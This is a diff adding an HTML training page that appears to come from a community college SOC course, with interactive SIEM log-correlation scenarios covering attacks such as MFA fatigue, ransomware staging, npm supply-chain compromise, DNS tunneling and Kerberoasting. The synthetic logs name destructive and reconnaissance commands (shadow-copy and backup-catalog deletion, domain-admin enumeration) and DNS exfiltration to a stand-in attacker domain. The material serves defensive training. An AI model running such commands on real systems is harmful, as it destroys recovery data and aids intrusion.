@@ -1,0 +1,1105 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>SIEM Correlation Practice — SOC Analyst Training</title>
+<meta name="description" content="Ten interactive SIEM log correlation scenarios for SOC analyst training. Identify attack chains hidden inside streams of routine network and security telemetry.">
+<style>
+  :root {
+    --bg: #f3f5f8;
+    --bg-panel: #ffffff;
+    --bg-console: #0d1117;
+    --bg-console-row: transparent;
+    --bg-console-row-hover: rgba(88, 166, 255, 0.08);
+    --bg-console-row-selected: rgba(88, 166, 255, 0.16);
+    --bg-console-row-malicious: rgba(248, 81, 73, 0.14);
+    --bg-console-row-malicious-revealed: rgba(248, 81, 73, 0.22);
+    --bg-console-row-correct: rgba(63, 185, 80, 0.18);
+    --bg-console-row-incorrect: rgba(248, 81, 73, 0.28);
+    --bg-console-row-missed: rgba(210, 153, 34, 0.22);
+
+    --fg: #1f2328;
+    --fg-muted: #5a6268;
+    --fg-console: #c9d1d9;
+    --fg-console-time: #58a6ff;
+    --fg-console-source: #d29922;
+    --fg-console-dim: #8b949e;
+
+    --accent: #1f6feb;
+    --accent-hover: #1158c7;
+    --success: #1a7f37;
+    --danger: #cf222e;
+    --warning: #9a6700;
+
+    --border: #d0d7de;
+    --border-strong: #a8b0b9;
+
+    --radius: 8px;
+    --radius-sm: 4px;
+
+    --font-display: ui-serif, 'Iowan Old Style', 'Palatino Linotype', Georgia, serif;
+    --font-body: ui-sans-serif, system-ui, -apple-system, 'Segoe UI', sans-serif;
+    --font-mono: ui-monospace, 'SF Mono', 'JetBrains Mono', Menlo, Consolas, monospace;
+
+    --shadow-sm: 0 1px 2px rgba(15, 23, 42, 0.06), 0 1px 3px rgba(15, 23, 42, 0.05);
+    --shadow-md: 0 4px 12px rgba(15, 23, 42, 0.08);
+  }
+
+  @media (prefers-color-scheme: dark) {
+    :root {
+      --bg: #0a0d12;
+      --bg-panel: #161b22;
+      --bg-console: #010409;
+      --bg-console-row-hover: rgba(88, 166, 255, 0.10);
+      --bg-console-row-selected: rgba(88, 166, 255, 0.22);
+
+      --fg: #e6edf3;
+      --fg-muted: #8b949e;
+
+      --accent: #58a6ff;
+      --accent-hover: #79b8ff;
+      --success: #3fb950;
+      --danger: #f85149;
+      --warning: #d29922;
+
+      --border: #30363d;
+      --border-strong: #484f58;
+
+      --shadow-sm: 0 1px 2px rgba(0, 0, 0, 0.3);
+      --shadow-md: 0 4px 12px rgba(0, 0, 0, 0.4);
+    }
+  }
+
+  * { box-sizing: border-box; }
+
+  html, body { margin: 0; padding: 0; }
+
+  body {
+    font-family: var(--font-body);
+    background: var(--bg);
+    color: var(--fg);
+    line-height: 1.55;
+    min-height: 100vh;
+    -webkit-font-smoothing: antialiased;
+  }
+
+  .skip-link {
+    position: absolute;
+    left: -9999px;
+    top: 0;
+    background: var(--accent);
+    color: #fff;
+    padding: 8px 14px;
+    z-index: 100;
+    text-decoration: none;
+    border-radius: 0 0 var(--radius-sm) 0;
+  }
+  .skip-link:focus { left: 0; }
+
+  header {
+    background: var(--bg-panel);
+    border-bottom: 1px solid var(--border);
+    padding: 18px 24px;
+  }
+  header .wrap {
+    max-width: 980px;
+    margin: 0 auto;
+    display: flex;
+    align-items: baseline;
+    justify-content: space-between;
+    flex-wrap: wrap;
+    gap: 12px;
+  }
+  header h1 {
+    font-family: var(--font-display);
+    font-weight: 600;
+    font-size: clamp(1.25rem, 2.2vw, 1.6rem);
+    margin: 0;
+    letter-spacing: -0.01em;
+  }
+  header h1 .badge {
+    display: inline-block;
+    margin-left: 8px;
+    padding: 2px 8px;
+    font-family: var(--font-mono);
+    font-size: 0.72rem;
+    background: var(--accent);
+    color: #fff;
+    border-radius: 999px;
+    vertical-align: middle;
+    letter-spacing: 0.05em;
+  }
+  header .progress-summary {
+    font-family: var(--font-mono);
+    font-size: 0.82rem;
+    color: var(--fg-muted);
+  }
+  header .progress-summary strong { color: var(--fg); font-weight: 600; }
+
+  main {
+    max-width: 980px;
+    margin: 0 auto;
+    padding: 24px;
+  }
+
+  .intro {
+    background: var(--bg-panel);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    padding: 20px 24px;
+    margin-bottom: 24px;
+    box-shadow: var(--shadow-sm);
+  }
+  .intro h2 {
+    font-family: var(--font-display);
+    margin: 0 0 8px;
+    font-size: 1.15rem;
+    font-weight: 600;
+  }
+  .intro p { margin: 0 0 8px; color: var(--fg-muted); }
+  .intro p:last-child { margin-bottom: 0; }
+
+  /* Scenario picker */
+  .scenario-nav {
+    background: var(--bg-panel);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    padding: 16px 18px;
+    margin-bottom: 20px;
+    box-shadow: var(--shadow-sm);
+  }
+  .scenario-nav h3 {
+    margin: 0 0 12px;
+    font-family: var(--font-display);
+    font-size: 0.95rem;
+    font-weight: 600;
+    color: var(--fg-muted);
+    text-transform: uppercase;
+    letter-spacing: 0.08em;
+  }
+  .scenario-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(44px, 1fr));
+    gap: 8px;
+  }
+  .scenario-btn {
+    font-family: var(--font-mono);
+    font-size: 0.9rem;
+    min-height: 44px;
+    min-width: 44px;
+    padding: 8px;
+    background: var(--bg);
+    color: var(--fg);
+    border: 1px solid var(--border);
+    border-radius: var(--radius-sm);
+    cursor: pointer;
+    transition: all 0.15s;
+    position: relative;
+    font-weight: 600;
+  }
+  .scenario-btn:hover { border-color: var(--accent); background: var(--bg-console-row-hover); }
+  .scenario-btn:focus-visible { outline: 2px solid var(--accent); outline-offset: 2px; }
+  .scenario-btn.active {
+    background: var(--accent);
+    color: #fff;
+    border-color: var(--accent);
+  }
+  .scenario-btn.completed::after {
+    content: '✓';
+    position: absolute;
+    top: 2px;
+    right: 4px;
+    font-size: 0.7rem;
+    color: var(--success);
+  }
+  .scenario-btn.active.completed::after { color: #fff; }
+
+  /* Scenario panel */
+  .scenario {
+    background: var(--bg-panel);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    padding: 22px 24px;
+    box-shadow: var(--shadow-sm);
+    margin-bottom: 20px;
+  }
+  .scenario-header {
+    display: flex;
+    align-items: baseline;
+    justify-content: space-between;
+    flex-wrap: wrap;
+    gap: 8px;
+    margin-bottom: 12px;
+  }
+  .scenario-title {
+    font-family: var(--font-display);
+    font-size: 1.3rem;
+    font-weight: 600;
+    margin: 0;
+    letter-spacing: -0.01em;
+  }
+  .scenario-meta {
+    display: flex;
+    gap: 10px;
+    flex-wrap: wrap;
+  }
+  .meta-chip {
+    font-family: var(--font-mono);
+    font-size: 0.72rem;
+    padding: 3px 9px;
+    border-radius: 999px;
+    background: var(--bg);
+    border: 1px solid var(--border);
+    color: var(--fg-muted);
+    text-transform: uppercase;
+    letter-spacing: 0.05em;
+  }
+  .meta-chip.diff-1 { background: rgba(63, 185, 80, 0.14); color: var(--success); border-color: transparent; }
+  .meta-chip.diff-2 { background: rgba(210, 153, 34, 0.18); color: var(--warning); border-color: transparent; }
+  .meta-chip.diff-3 { background: rgba(248, 81, 73, 0.18); color: var(--danger); border-color: transparent; }
+
+  .briefing {
+    color: var(--fg-muted);
+    margin: 0 0 18px;
+    font-size: 0.95rem;
+  }
+  .briefing strong { color: var(--fg); }
+
+  /* Log console */
+  .console {
+    background: var(--bg-console);
+    border-radius: var(--radius-sm);
+    padding: 6px 0;
+    font-family: var(--font-mono);
+    font-size: 0.85rem;
+    line-height: 1.6;
+    color: var(--fg-console);
+    overflow-x: auto;
+  }
+  .log-row {
+    display: flex;
+    gap: 12px;
+    padding: 7px 16px 7px 14px;
+    border-left: 3px solid transparent;
+    cursor: pointer;
+    user-select: none;
+    transition: background 0.1s;
+    white-space: pre-wrap;
+    word-break: break-word;
+  }
+  .log-row:hover { background: var(--bg-console-row-hover); }
+  .log-row.selected {
+    background: var(--bg-console-row-selected);
+    border-left-color: var(--accent);
+  }
+  .log-row:focus-visible {
+    outline: 2px solid var(--accent);
+    outline-offset: -2px;
+  }
+  .log-row .time { color: var(--fg-console-time); flex-shrink: 0; }
+  .log-row .source { color: var(--fg-console-source); flex-shrink: 0; }
+  .log-row .msg { flex: 1; }
+
+  /* Result states (only after submit) */
+  .log-row.revealed-correct {
+    background: var(--bg-console-row-correct);
+    border-left-color: var(--success);
+  }
+  .log-row.revealed-incorrect {
+    background: var(--bg-console-row-incorrect);
+    border-left-color: var(--danger);
+  }
+  .log-row.revealed-missed {
+    background: var(--bg-console-row-missed);
+    border-left-color: var(--warning);
+  }
+  .log-row .marker {
+    flex-shrink: 0;
+    width: 18px;
+    text-align: center;
+    color: var(--fg-console-dim);
+    font-weight: 700;
+  }
+  .log-row.revealed-correct .marker { color: var(--success); }
+  .log-row.revealed-incorrect .marker { color: var(--danger); }
+  .log-row.revealed-missed .marker { color: var(--warning); }
+
+  /* Controls */
+  .controls {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    flex-wrap: wrap;
+    margin-top: 18px;
+  }
+  .selection-count {
+    font-family: var(--font-mono);
+    font-size: 0.85rem;
+    color: var(--fg-muted);
+    flex: 1;
+  }
+  .selection-count strong { color: var(--fg); }
+
+  button.btn {
+    font-family: var(--font-body);
+    font-size: 0.95rem;
+    font-weight: 600;
+    min-height: 44px;
+    padding: 0 22px;
+    border-radius: var(--radius-sm);
+    cursor: pointer;
+    transition: all 0.15s;
+    border: 1px solid transparent;
+  }
+  button.btn:focus-visible { outline: 2px solid var(--accent); outline-offset: 2px; }
+  button.btn:disabled { opacity: 0.5; cursor: not-allowed; }
+
+  .btn-primary {
+    background: var(--accent);
+    color: #fff;
+  }
+  .btn-primary:hover:not(:disabled) { background: var(--accent-hover); }
+
+  .btn-secondary {
+    background: var(--bg);
+    color: var(--fg);
+    border-color: var(--border-strong);
+  }
+  .btn-secondary:hover:not(:disabled) { background: var(--bg-console-row-hover); }
+
+  /* Feedback */
+  .feedback {
+    margin-top: 18px;
+    padding: 16px 20px;
+    border-radius: var(--radius);
+    border-left: 4px solid var(--border-strong);
+    background: var(--bg);
+  }
+  .feedback.score-perfect { border-left-color: var(--success); }
+  .feedback.score-good { border-left-color: var(--accent); }
+  .feedback.score-partial { border-left-color: var(--warning); }
+  .feedback.score-poor { border-left-color: var(--danger); }
+
+  .feedback h4 {
+    margin: 0 0 8px;
+    font-family: var(--font-display);
+    font-size: 1.05rem;
+  }
+  .feedback .score-line {
+    font-family: var(--font-mono);
+    font-size: 0.85rem;
+    color: var(--fg-muted);
+    margin-bottom: 12px;
+  }
+  .feedback .score-line strong { color: var(--fg); }
+
+  .feedback .explanation {
+    margin: 0 0 12px;
+    font-size: 0.93rem;
+  }
+
+  .feedback .kill-chain {
+    margin: 12px 0 0;
+    padding: 12px 14px;
+    background: var(--bg-panel);
+    border: 1px solid var(--border);
+    border-radius: var(--radius-sm);
+  }
+  .feedback .kill-chain h5 {
+    margin: 0 0 8px;
+    font-family: var(--font-display);
+    font-size: 0.9rem;
+    font-weight: 600;
+    text-transform: uppercase;
+    letter-spacing: 0.05em;
+    color: var(--fg-muted);
+  }
+  .feedback .kill-chain ol {
+    margin: 0;
+    padding-left: 22px;
+    font-size: 0.88rem;
+  }
+  .feedback .kill-chain li { margin-bottom: 4px; }
+  .feedback .kill-chain .stage {
+    font-family: var(--font-mono);
+    font-size: 0.78rem;
+    color: var(--accent);
+    text-transform: uppercase;
+    letter-spacing: 0.05em;
+    margin-right: 6px;
+  }
+
+  /* Nav buttons */
+  .nav-row {
+    display: flex;
+    justify-content: space-between;
+    gap: 12px;
+    margin-top: 4px;
+  }
+  .nav-row .btn-secondary { flex: 0; min-width: 110px; }
+
+  footer {
+    text-align: center;
+    padding: 24px;
+    color: var(--fg-muted);
+    font-size: 0.82rem;
+    border-top: 1px solid var(--border);
+    margin-top: 24px;
+  }
+  footer .program { font-weight: 600; color: var(--fg); }
+
+  /* SR-only utility */
+  .sr-only {
+    position: absolute;
+    width: 1px; height: 1px;
+    padding: 0; margin: -1px;
+    overflow: hidden;
+    clip: rect(0,0,0,0);
+    white-space: nowrap;
+    border: 0;
+  }
+
+  /* Responsive console scaling */
+  @media (max-width: 600px) {
+    .console { font-size: 0.76rem; }
+    .log-row { padding: 6px 10px 6px 10px; gap: 8px; }
+    main { padding: 16px; }
+    .scenario { padding: 18px 16px; }
+  }
+
+  @media (prefers-reduced-motion: reduce) {
+    * { transition: none !important; animation: none !important; }
+  }
+</style>
+</head>
+<body>
+<a href="#main" class="skip-link">Skip to main content</a>
+
+<header>
+  <div class="wrap">
+    <h1>SIEM Correlation Practice <span class="badge">SOC TIER 1</span></h1>
+    <div class="progress-summary" aria-live="polite">
+      Completed: <strong id="completedCount">0</strong> / <strong id="totalCount">10</strong>
+      &nbsp;·&nbsp; Score: <strong id="totalScore">0</strong>
+    </div>
+  </div>
+</header>
+
+<main id="main">
+  <section class="intro" aria-labelledby="introHeading">
+    <h2 id="introHeading">How this works</h2>
+    <p>Each scenario presents a stream of raw log events from a SIEM. Some events belong to a single attack chain; the rest are routine activity (noise). Click each log line you believe is part of the attack, then submit to see how your correlation compares to the analyst's notes.</p>
+    <p>Your task is the same one a SOC analyst faces during alert triage: <strong>pivot on identity, host, IP, and time</strong> to find what hangs together.</p>
+  </section>
+
+  <nav class="scenario-nav" aria-label="Select scenario">
+    <h3>Scenarios</h3>
+    <div class="scenario-grid" id="scenarioGrid" role="tablist"></div>
+  </nav>
+
+  <section class="scenario" id="scenarioPanel" aria-live="polite">
+    <!-- Populated by JS -->
+  </section>
+</main>
+
+<footer>
+  <p>Built for <span class="program">Networking &amp; Cybersecurity</span> · Brookdale Community College · 2026</p>
+</footer>
+
+<script>
+// ============================================================
+// SCENARIO DATA
+// ============================================================
+// Each scenario:
+//   title, difficulty (1-3), briefing
+//   events: [{time, source, msg, malicious: bool, stage: 'recon'|'access'|'execution'|'persistence'|'lateral'|'exfil'|'impact'|null}]
+//   killChain: ordered list of {stage, description} explaining the attack
+//   explanation: paragraph explaining the correlation logic
+// ============================================================
+
+const SCENARIOS = [
+  // ────────────────────────────────────────────────────────
+  // 1. WARM-UP: Tor login → PowerShell → exfil
+  // ────────────────────────────────────────────────────────
+  {
+    title: "After-Hours Office 365 Compromise",
+    difficulty: 1,
+    briefing: "It's 2:15 AM. The SIEM is quiet except for some routine activity. Your job: find any events that form a coherent attack chain involving a finance user.",
+    events: [
+      { time: "02:14:22", source: "FIREWALL", msg: "ALLOW tcp 10.4.22.18 → 8.8.8.8:443 (DNS-over-HTTPS)" },
+      { time: "02:15:01", source: "O365-AUTH", msg: "FAIL login user=j.morgan src=185.220.101.45 (Tor exit node, Estonia)", malicious: true, stage: "access" },
+      { time: "02:15:10", source: "EMAIL", msg: "Marketing newsletter sent to 12,400 recipients via SendGrid" },
+      { time: "02:15:34", source: "O365-AUTH", msg: "SUCCESS login user=j.morgan src=185.220.101.45 (after 14 failed attempts in 33 sec)", malicious: true, stage: "access" },
+      { time: "02:15:47", source: "BACKUP", msg: "Nightly backup of file-share-03 completed, 412GB" },
+      { time: "02:16:08", source: "EDR", msg: "PowerShell base64-encoded execution on HOST-FIN-08, user context j.morgan", malicious: true, stage: "execution" },
+      { time: "02:16:11", source: "VPN", msg: "User k.patel connected from corporate office IP, normal location" },
+      { time: "02:16:42", source: "FIREWALL", msg: "ALLOW tcp HOST-FIN-08 → 185.220.101.45:443, 18MB outbound (encrypted)", malicious: true, stage: "exfil" },
+      { time: "02:17:02", source: "DHCP", msg: "Lease renewed for PRINTER-LOBBY-2 (10.4.99.12)" }
+    ],
+    explanation: "The pivot is the Tor IP <code>185.220.101.45</code>. It appears at the failed-then-successful login (brute force/password spray) and again at the 18MB outbound transfer. Between them, PowerShell with base64 encoding runs in j.morgan's context — a classic obfuscated payload after stolen credentials. The Tor source, off-hours timing, and finance host endpoint all reinforce the chain.",
+    killChain: [
+      { stage: "Credential Access", description: "Brute force / password spray from Tor exit node (14 fails → 1 success in 33 sec)" },
+      { stage: "Execution", description: "Base64-encoded PowerShell on HOST-FIN-08 under the compromised account" },
+      { stage: "Exfiltration", description: "18MB encrypted outbound back to the same Tor IP" }
+    ]
+  },
+
+  // ────────────────────────────────────────────────────────
+  // 2. MFA fatigue → inbox rule
+  // ────────────────────────────────────────────────────────
+  {
+    title: "MFA Fatigue and the Quiet Inbox Rule",
+    difficulty: 2,
+    briefing: "An executive assistant called the helpdesk this morning saying their MFA prompts \"won't stop.\" Look at the overnight logs and figure out what actually happened.",
+    events: [
+      { time: "23:14:02", source: "PROXY", msg: "GET https://news.bbc.co.uk/ user=a.chen (allowed, category: news)" },
+      { time: "23:18:47", source: "AAD-MFA", msg: "MFA push DENY user=a.chen src=104.28.42.91 (Cloudflare/unknown ASN)", malicious: true, stage: "access" },
+      { time: "23:19:12", source: "AAD-MFA", msg: "MFA push DENY user=a.chen src=104.28.42.91 (4th attempt in 60s)", malicious: true, stage: "access" },
+      { time: "23:19:55", source: "AAD-MFA", msg: "MFA push DENY user=a.chen src=104.28.42.91 (9th attempt in 90s)", malicious: true, stage: "access" },
+      { time: "23:21:33", source: "PRINTER", msg: "Toner low warning, MFC-FLR3-04" },
+      { time: "23:22:18", source: "AAD-MFA", msg: "MFA push APPROVE user=a.chen src=104.28.42.91 (after 22 denies)", malicious: true, stage: "access" },
+      { time: "23:22:51", source: "EXO-MAILBOX", msg: "Inbox rule created user=a.chen: move messages from CFO to RSS Feeds folder, mark as read", malicious: true, stage: "persistence" },
+      { time: "23:23:40", source: "EXO-MAILBOX", msg: "Outbound email user=a.chen subject:\"URGENT - wire instructions update\" to vendor-billing@acme-supply.co", malicious: true, stage: "impact" },
+      { time: "23:25:14", source: "VPN", msg: "User m.delgado disconnected after 8h session, normal logout" },
+      { time: "23:31:02", source: "PROXY", msg: "POST https://api.openai.com/v1/chat user=r.huang (allowed)" }
+    ],
+    explanation: "This is textbook <strong>MFA fatigue / push bombing</strong>: 22 push denies before the user finally approved one out of frustration or confusion. The IP <code>104.28.42.91</code> ties the bombing to the approved login. Right after, the attacker creates an inbox rule to hide CFO replies (so the victim won't see the response), then sends a fraudulent wire-change email. The BBC pageview, toner alert, m.delgado VPN logout, and ChatGPT call are unrelated noise.",
+    killChain: [
+      { stage: "Credential Access", description: "MFA push bombing — sustained prompts until the user approved one" },
+      { stage: "Persistence", description: "Mailbox rule hides replies from the CFO to evade victim detection" },
+      { stage: "Impact (BEC)", description: "Fraudulent wire-change email sent from compromised account" }
+    ]
+  },
+
+  // ────────────────────────────────────────────────────────
+  // 3. Insider data theft — USB + cloud
+  // ────────────────────────────────────────────────────────
+  {
+    title: "Resignation, Then a Busy Afternoon",
+    difficulty: 2,
+    briefing: "HR notified Security that a senior engineer submitted resignation this morning. Review the day's logs for anything that looks like data exfiltration in progress.",
+    events: [
+      { time: "09:02:11", source: "BADGE", msg: "Entry: t.bauer at MAIN-ENTRANCE-WEST, normal arrival" },
+      { time: "10:14:33", source: "TEAMS", msg: "Channel message t.bauer in #engineering: \"Heads up, last day is Friday\"" },
+      { time: "13:42:07", source: "FILESERVER", msg: "Bulk read user=t.bauer \\\\fs01\\engineering\\source\\ (2,847 files, 4.3GB)", malicious: true, stage: "recon" },
+      { time: "13:44:51", source: "DLP", msg: "Sensitivity label \"CONFIDENTIAL - Source Code\" detected in copy operation by t.bauer", malicious: true, stage: "recon" },
+      { time: "13:51:18", source: "USB", msg: "Mass-storage device connected to LAPTOP-T-BAUER, vendor=SanDisk, capacity=128GB", malicious: true, stage: "exfil" },
+      { time: "13:52:02", source: "PRINTER", msg: "Print job t.bauer: \"company-handbook.pdf\" 42 pages" },
+      { time: "13:58:44", source: "EDR", msg: "File copy operation: 4.1GB written to E:\\ on LAPTOP-T-BAUER", malicious: true, stage: "exfil" },
+      { time: "14:11:33", source: "PROXY", msg: "POST https://upload.mega.nz/ user=t.bauer (allowed, 3.9GB)", malicious: true, stage: "exfil" },
+      { time: "14:14:02", source: "CALENDAR", msg: "Meeting created t.bauer: \"1:1 with manager\" tomorrow 10am" },
+      { time: "14:22:18", source: "BADGE", msg: "Exit: c.okonkwo at SIDE-EXIT-B, normal departure" }
+    ],
+    explanation: "Insider threat pattern: bulk read of source code (4.3GB across 2,847 files) triggers DLP, then the user mounts a 128GB USB and writes ~4GB to it — AND uploads ~4GB to MEGA. The data goes out via <strong>two parallel channels</strong>. The handbook print job, calendar 1:1, and c.okonkwo's badge-out are normal. The Teams \"last day Friday\" message is context-setting but isn't itself the attack — it's the motive, not an action.",
+    killChain: [
+      { stage: "Collection", description: "Bulk file access of confidential source code triggers DLP" },
+      { stage: "Exfil (USB)", description: "128GB removable media attached, 4.1GB copied" },
+      { stage: "Exfil (Cloud)", description: "3.9GB upload to MEGA — redundant channel in case USB is blocked" }
+    ]
+  },
+
+  // ────────────────────────────────────────────────────────
+  // 4. Ransomware precursor
+  // ────────────────────────────────────────────────────────
+  {
+    title: "Domain Controller, Saturday Night",
+    difficulty: 3,
+    briefing: "It's Saturday 11pm. Skeleton crew. The SIEM is quieter than usual but a few alerts have come in. Identify the pre-ransomware activity before encryption begins.",
+    events: [
+      { time: "22:48:09", source: "DNS", msg: "Query: outlook.office365.com from 10.2.14.7 (cached)" },
+      { time: "22:51:33", source: "EDR", msg: "rundll32.exe spawned by winword.exe on HOST-HR-12, parent: outlook.exe", malicious: true, stage: "execution" },
+      { time: "22:52:18", source: "FIREWALL", msg: "ALLOW HOST-HR-12 → 23.106.215.77:443 (beacon pattern, 60s intervals)", malicious: true, stage: "execution" },
+      { time: "22:55:02", source: "EDR", msg: "Process: net.exe group \"Domain Admins\" /domain on HOST-HR-12", malicious: true, stage: "recon" },
+      { time: "22:55:48", source: "EDR", msg: "Process: nltest.exe /dclist on HOST-HR-12", malicious: true, stage: "recon" },
+      { time: "22:57:11", source: "WINDOWS", msg: "Event 4624 logon type 3 to DC-01 from HOST-HR-12, user=svc_backup", malicious: true, stage: "lateral" },
+      { time: "22:58:33", source: "PRINTER", msg: "Cartridge replaced, MFC-LOBBY-1" },
+      { time: "23:01:47", source: "EDR", msg: "Process: vssadmin.exe delete shadows /all /quiet on DC-01", malicious: true, stage: "impact" },
+      { time: "23:02:02", source: "BACKUP", msg: "Veeam job \"weekly-full\" completed successfully" },
+      { time: "23:02:19", source: "EDR", msg: "Process: wbadmin.exe delete catalog -quiet on DC-01", malicious: true, stage: "impact" },
+      { time: "23:14:48", source: "DHCP", msg: "Lease offered for new device on guest VLAN" }
+    ],
+    explanation: "This is a textbook <strong>ransomware staging</strong> sequence. <code>winword.exe → rundll32.exe</code> is a classic Office-macro execution pattern (likely a malicious .docm attachment). The C2 beacon at regular 60s intervals to <code>23.106.215.77</code> is a Cobalt Strike fingerprint. Then comes Active Directory recon (<code>net group \"Domain Admins\"</code>, <code>nltest /dclist</code>), lateral movement to the DC using the backup service account, and finally the smoking gun: <strong>shadow copy and backup catalog deletion</strong> — the attacker is removing recovery options right before encryption. The lobby cartridge swap, Veeam success, and DHCP offer are noise.",
+    killChain: [
+      { stage: "Execution", description: "Malicious Word macro spawns rundll32 — likely phishing attachment" },
+      { stage: "C2", description: "Regular-interval beaconing to known-bad IP (Cobalt Strike fingerprint)" },
+      { stage: "Discovery", description: "Active Directory enumeration: domain admins, DC list" },
+      { stage: "Lateral Movement", description: "Network logon to DC-01 using svc_backup service account" },
+      { stage: "Impact prep", description: "vssadmin and wbadmin deletion — destroying recovery options before encryption" }
+    ]
+  },
+
+  // ────────────────────────────────────────────────────────
+  // 5. Supply chain — malicious npm
+  // ────────────────────────────────────────────────────────
+  {
+    title: "The CI Pipeline That Phoned Home",
+    difficulty: 3,
+    briefing: "A developer pushed a routine dependency update this afternoon. The build went green. Then the EDR fired. Trace the chain.",
+    events: [
+      { time: "14:02:11", source: "GITHUB", msg: "Push to repo: webapp-frontend by dev:l.osei, commit: bump deps" },
+      { time: "14:02:48", source: "CI-RUNNER", msg: "Pipeline started: webapp-frontend on runner-04" },
+      { time: "14:03:12", source: "PROXY", msg: "GET https://registry.npmjs.org/event-stream/-/event-stream-3.3.6.tgz from runner-04", malicious: true, stage: "execution" },
+      { time: "14:03:14", source: "PROXY", msg: "GET https://registry.npmjs.org/flatmap-stream/-/flatmap-stream-0.1.1.tgz from runner-04 (transitive)", malicious: true, stage: "execution" },
+      { time: "14:03:48", source: "CI-RUNNER", msg: "npm install completed, 1,247 packages installed" },
+      { time: "14:04:02", source: "PROXY", msg: "GET https://registry.npmjs.org/react/-/react-18.2.0.tgz from runner-04" },
+      { time: "14:04:33", source: "EDR", msg: "node.exe spawned child process: powershell -nop -w hidden on runner-04", malicious: true, stage: "execution" },
+      { time: "14:04:52", source: "FIREWALL", msg: "ALLOW runner-04 → 45.61.169.32:8443 (low-volume, periodic)", malicious: true, stage: "exfil" },
+      { time: "14:05:11", source: "VAULT", msg: "Read secret runner-04: AWS_DEPLOY_KEY (svc_ci access)", malicious: true, stage: "exfil" },
+      { time: "14:08:22", source: "CI-RUNNER", msg: "Pipeline status: SUCCESS — artifact published" },
+      { time: "14:14:18", source: "GITHUB", msg: "PR merged: dependabot/security-patch by k.lindgren" }
+    ],
+    explanation: "A <strong>compromised npm package</strong>: <code>flatmap-stream</code> pulled in as a transitive dependency of <code>event-stream</code> (real 2018 incident) contains malicious code. Once <code>npm install</code> runs in CI, node.exe spawns a hidden PowerShell — extremely unusual in a build pipeline. Then comes low-volume C2 to <code>45.61.169.32:8443</code> and theft of the AWS deploy key from the vault. The legitimate React download, successful pipeline (the malicious code didn't break the build, by design), and unrelated PR are noise. <strong>Key lesson:</strong> build pipelines need the same EDR coverage as user endpoints, and outbound network from CI runners should be tightly controlled.",
+    killChain: [
+      { stage: "Initial Access", description: "Malicious transitive npm dependency (event-stream → flatmap-stream)" },
+      { stage: "Execution", description: "node.exe spawns hidden PowerShell during install hook" },
+      { stage: "C2", description: "Low-volume callback to attacker infrastructure" },
+      { stage: "Credential Access", description: "AWS deploy key read from vault using CI service account" }
+    ]
+  },
+
+  // ────────────────────────────────────────────────────────
+  // 6. DNS tunneling
+  // ────────────────────────────────────────────────────────
+  {
+    title: "The DNS Server Is Working Overtime",
+    difficulty: 3,
+    briefing: "A SOC analyst noticed the DNS server's query volume is up 18% this week. Most of it looks normal. But somewhere in the noise, something is being exfiltrated. Find it.",
+    events: [
+      { time: "08:04:11", source: "DNS", msg: "Query A: www.google.com from 10.4.18.22 (cached)" },
+      { time: "08:04:12", source: "DNS", msg: "Query A: cdn.jsdelivr.net from 10.4.18.22 (cached)" },
+      { time: "08:04:14", source: "DNS", msg: "Query TXT: aGVsbG8td29ybGQtMTIz.exfil.attacker-domain.xyz from 10.4.18.22", malicious: true, stage: "exfil" },
+      { time: "08:04:15", source: "DNS", msg: "Query A: outlook.office365.com from 10.4.18.22 (cached)" },
+      { time: "08:04:17", source: "DNS", msg: "Query TXT: c2VjcmV0LWRhdGEtNDU2.exfil.attacker-domain.xyz from 10.4.18.22", malicious: true, stage: "exfil" },
+      { time: "08:04:19", source: "DNS", msg: "Query A: telemetry.microsoft.com from 10.4.18.22 (cached)" },
+      { time: "08:04:22", source: "DNS", msg: "Query TXT: cGFzc3dvcmRzLWR1bXA3ODk.exfil.attacker-domain.xyz from 10.4.18.22", malicious: true, stage: "exfil" },
+      { time: "08:04:25", source: "DNS", msg: "Query A: github.com from 10.4.18.22 (cached)" },
+      { time: "08:04:28", source: "DNS", msg: "Query TXT: ZmluYWwtY2h1bmstOTk5.exfil.attacker-domain.xyz from 10.4.18.22", malicious: true, stage: "exfil" },
+      { time: "08:04:31", source: "DNS", msg: "Query A: slack.com from 10.4.18.22 (cached)" }
+    ],
+    explanation: "This is <strong>DNS tunneling exfiltration</strong>. The attacker hides data in the subdomain of TXT queries: the long, random-looking strings (<code>aGVsbG8td29ybGQtMTIz</code>, etc.) are base64-encoded chunks of stolen data. The attacker controls the authoritative name server for <code>attacker-domain.xyz</code>, so every TXT query delivers a payload to them — using DNS, which is rarely blocked. The legitimate cached A queries (Google, Microsoft, GitHub) are the camouflage. Detection cues: <strong>(1)</strong> TXT record queries are uncommon for client workstations, <strong>(2)</strong> the subdomains have high entropy, <strong>(3)</strong> the same source IP is making them repeatedly to the same parent domain.",
+    killChain: [
+      { stage: "Exfiltration", description: "Data encoded into subdomains of TXT queries to attacker-controlled domain" },
+      { stage: "Defense Evasion", description: "Interleaved with legitimate DNS to blend in with normal traffic" }
+    ]
+  },
+
+  // ────────────────────────────────────────────────────────
+  // 7. Kerberoasting
+  // ────────────────────────────────────────────────────────
+  {
+    title: "Service Tickets, Service Tickets Everywhere",
+    difficulty: 3,
+    briefing: "Your detection engineer just deployed a Sigma rule for Kerberoasting last week. Today it lit up. Find the attack chain.",
+    events: [
+      { time: "11:18:42", source: "AAD", msg: "User f.alvarez signed in from corporate office, MFA satisfied" },
+      { time: "11:22:11", source: "WINDOWS-DC", msg: "Event 4769 TGS request user=f.alvarez service=HOST/web01.corp.local" },
+      { time: "11:22:13", source: "WINDOWS-DC", msg: "Event 4769 TGS request user=f.alvarez service=MSSQL/sql-prod.corp.local enc=0x17 (RC4)", malicious: true, stage: "access" },
+      { time: "11:22:14", source: "WINDOWS-DC", msg: "Event 4769 TGS request user=f.alvarez service=MSSQL/sql-hr.corp.local enc=0x17 (RC4)", malicious: true, stage: "access" },
+      { time: "11:22:15", source: "WINDOWS-DC", msg: "Event 4769 TGS request user=f.alvarez service=svc_backup enc=0x17 (RC4)", malicious: true, stage: "access" },
+      { time: "11:22:16", source: "WINDOWS-DC", msg: "Event 4769 TGS request user=f.alvarez service=svc_jenkins enc=0x17 (RC4)", malicious: true, stage: "access" },
